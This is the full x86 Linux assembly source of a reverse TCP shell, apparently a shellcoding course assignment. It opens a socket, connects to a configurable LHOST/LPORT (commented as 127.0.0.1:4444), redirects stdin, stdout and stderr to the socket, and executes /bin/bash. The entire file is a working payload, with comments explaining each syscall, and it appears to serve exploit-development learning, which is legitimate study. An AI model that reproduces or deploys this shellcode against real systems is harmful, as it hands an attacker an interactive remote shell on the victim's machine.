; A1 - Shell_Reverse_TCP
; William Mark Moody
; PA-25640
; 28.12.2021

global _start

section .text
_start:
	
	; socketcall (int call, unsigned long *args);
	; socket (int domain, int type, int protocol);

	push byte 0x6 			; int protocol => IPPROTO_TCP = 0x6
	push byte 0x1			; int type => SOCK_STREAM = 0x1
	push byte 0x2			; int domain => AF_INET = 0x2

	xor eax, eax
	mov al, 0x66			; SYS_SOCKETCALL = 102
	mov esi, eax			; Save for later (to reduce shellcode length)
	xor ebx, ebx
	mov bl, 0x1				; int call => SYS_SOCKET = 0x1
	mov ecx, esp			; unsigned long *args => arguments for socket()
	int 0x80

	mov edi, eax			; Save the return value for later (sockfd)
	
	; socketcall (int call, unsigned long *args);
	; connect (int sockfd, const sockaddr *addr,
	;		   socklen_t addrlen);

	; struct sockaddr_in {
	;     short sin_family;			-- 2 bytes, AF_INET
	;     unsigned short sin_port;	-- 2 bytes, htons(PORT)
	;     struct in_addr;			-- 4 bytes, INADDR_ANY (0x00000000)
	;     char sin_zero[8];			-- 8 bytes, 0x00000000 0x00000000
	; }

	; struct in_addr {
	;     unsigned long s_addr;
	; }
	
	xor ebx, ebx
	push dword ebx			; char sin_zero[8] 2/2 => 0x00000000
	push dword ebx			; char sin_zero[8] 1/2 => 0x00000000
	push dword LHOST		; struct in_addr => 127.0.0.1
	push word LPORT			; unsigned short sin_port => 4444
	mov bl, 0x2
	push word bx			; short sin_family => AF_INET = 0x2

	mov ecx, esp			; Save pointer to struct

	push byte 0x10			; socklen_t addrlen => 16 bytes (see above)
	push dword ecx			; const sockaddr *addr => 
	push dword edi			; int sockfd => return value from SYS_SOCKET

	mov eax, esi			; SYS_SOCKETCALL = 102
	mov bl, 0x3				; int call => SYS_CONNECT = 0x3
	mov ecx, esp			; unsigned long *args => arguments for connect()
	int 0x80

	; dup2 (int oldfd, int newfd);

	xor eax, eax
	mov al, 0x3f			; SYS_DUP2 = 0x3f
	mov ebx, edi			; int newfd => return value from SYS_SOCKET
	xor ecx, ecx			; int oldfd => STDIN = 0x0
	int 0x80

	; dup2 (int oldfd, int newfd);

	mov al, 0x3f			; SYS_DUP2 = 0x3f
							; int newfd => return value from SYS_SOCKET
	inc ecx					; int oldfd => STDOUT = 0x1
	int 0x80

	; dup2 (int oldfd, int newfd);

	mov al, 0x3f			; SYS_DUP2 = 0x3f
							; int newfd => return value from SYS_SOCKET
	inc ecx					; int oldfd => STDERR = 0x2
	int 0x80

	; execve (const char *pathname, char *const argv[],
	;         char *const envp[]);

	push byte 0x68			; ...h
	push dword 0x7361622f	; sab/
	push dword 0x6e69622f	; nib/

	mov ebx, esp			; const char *pathname => *"//bin/bash"
	xor eax, eax
	push eax
	mov edx, esp			; char *const envp[] => NULL
	push ebx,
	mov ecx, esp			; char *const argv[] => *{*"//bin/bash"}
	mov al, 0xb				; SYS_EXECVE = 0xb
	int 0x80
